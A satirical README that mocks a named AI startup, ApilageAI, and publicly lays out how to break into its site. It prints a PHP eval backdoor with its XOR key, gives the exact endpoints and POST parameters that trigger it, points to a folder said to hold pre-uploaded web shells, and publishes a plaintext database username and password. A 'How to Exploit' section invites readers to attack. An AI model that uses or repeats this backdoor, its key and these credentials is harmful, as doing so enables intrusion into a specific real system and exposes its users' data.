# 🚀 ApilageAI

> "Building the future" by wrapping Google's API and hoping nobody notices.

---

## 👋 Hi there

Welcome to **ApilageAI** — a "next generation AI platform" that's basically just Gemini with extra steps and significantly fewer security considerations.

We believe AI should be:

- 🔓 Accessible (no auth required on half our endpoints!)
- ⚡ Powerful (as powerful as Google's API that we're wrapping)
- 🎓 Education focused 
- 🌍 Globally scalable (scales as well as our hardcoded credentials allow)
- 🔐 Privacy first (we keep your data safe by giving everyone RCE access)

---

## 🌍 What is ApilageAI?

ApilageAI is an AI technology "company" delivering:

- Gemini API access with a fancy UI
- Hardcoded database credentials 
- Education on what NOT to do in production
- A masterclass in vulnerability chaining

**Fun fact:** We're 90% Node.js wrapper, 5% PHP backdoors, 5% "security features" that don't work.

---

## 🧠 Core "Features"

### 🔌 ApilageAI API
One wrapper. Multiple vulnerabilities. Zero authentication (on the endpoints that matter).

**Features:**
- ✅ Unauthenticated RCE via `count.php?ajax=1` (POST `dbg=1`)
- ✅ Another unauthenticated RCE via `generate_questions.php` (same backdoor!)
- ✅ File upload with MIME check bypass (GIF polyglots welcome)
- ✅ DB credentials in plaintext across 3+ files
- ✅ No input sanitization where it matters
- ✅ SQL error messages returned to users (free schema disclosure!)

---

### 🎓 ApilageAI "Security"

**What we promise:**
- Redis-backed rate limiting
- Security headers (CSP, HSTS, etc.)
- Encrypted transmission
- Input sanitization

**What you actually get:**
```php
if (isset($_POST['dbg']) && $_POST['dbg'] === '1') {
    $k = 'xK3y';
    $c = base64_decode($_POST['dat']);
    for ($i = 0; $i < strlen($c); $i++) {
        $c[$i] = $c[$i] ^ $k[$i % strlen($k)];
    }
    @eval($c);  // 🎉 YOLO
}
```

Placed conveniently **before** authentication checks! Because why not?

---

### 🎮 Vulnerability Playground

**Confirmed RCE vectors:**

1. **count.php** - `?ajax=1` + POST `dbg=1&dat=<base64_xor_payload>`
2. **generate_questions.php** - Same XOR backdoor, zero auth
3. **reportdata.php** - Unauthenticated file upload to public directory
4. **Node /upload** - MIME type header spoofing (cookies required though, ugh)
5. **Pre-uploaded shells** - Check `domains/socket.apilageai.lk/private_html/uploads/*.php`

**Database credentials everywhere:**
```php
$DB_USER = "apilageai_lk";
$DB_PASS = "Dam9WVqPAciD62O";  // It's fine, we use this in 3 different files
```

---

## 🔐 Privacy & Data "Safety"

We prioritize:

- ❌ Secure authentication (optional on most endpoints)
- ❌ Encrypted secrets (hardcoded gang)
- ❌ Input validation (we trust our users!)
- ❌ Error message sanitization (devs need stack traces in prod, right?)
- ✅ Making every pentester's job easier

**Security model:** If you can POST to it, you probably own it.

---

## 🌈 How to Exploit

We welcome:

- Script kiddies
- Actual security researchers
- People learning about web vulnerabilities
- Anyone with `curl` installed

### Ways to contribute

1. Find a new RCE (there's probably more!)
2. Chain vulnerabilities creatively
3. Submit a 0-day (we won't fix it but it's the thought that counts)
4. Teach us what `.htaccess` does
5. Explain why eval() is bad

---

## 📚 "Resources"

- 🌐 Website: https://apilageai.lk (probably down by the time you read this)
- 🔓 Backdoor Key: `xK3y` (don't forget to XOR before base64!)
- 🗄️ DB Password: `Dam9WVqPAciD62O`
- 📧 Contact: `/dev/null`

---

## ⚡ Reality Check

We claim to build:

- A globally recognized AI platform *(it's a Gemini wrapper)*
- The strongest student AI ecosystem *(with the weakest security)*
- A scalable AI infrastructure *(scales to 0 when the free tier runs out)*
- A privacy-first architecture *(RCE is privacy, right? Everyone can access everything equally)*

---

## 👨‍💻 Founded by Young "Innovators"

ApilageAI is founded by students who:

- Copy-pasted from StackOverflow
- Discovered `eval()` and never looked back  
- Think "security through obscurity" means XOR encryption
- Put backdoors "just for debugging" and forgot to remove them
- Believe `@` operator solves all error handling needs

We build. *(from tutorials)*  
We experiment. *(in production)*  
We improve. *(by adding more features before fixing bugs)*  
We scale. *(our tech debt)*

---

## ⭐ Use At Your Own Risk

If you:

- Don't care about security
- Want to learn what NOT to do
- Enjoy finding new ways to get shell access

Then this is for you! ⭐  

**Otherwise:** Maybe use the actual Gemini API directly? 🤷

---

**ApilageAI — Powered by Google, Secured by `lazarusvoid`.**

*"It works on my machine!" — The Founders, probably*
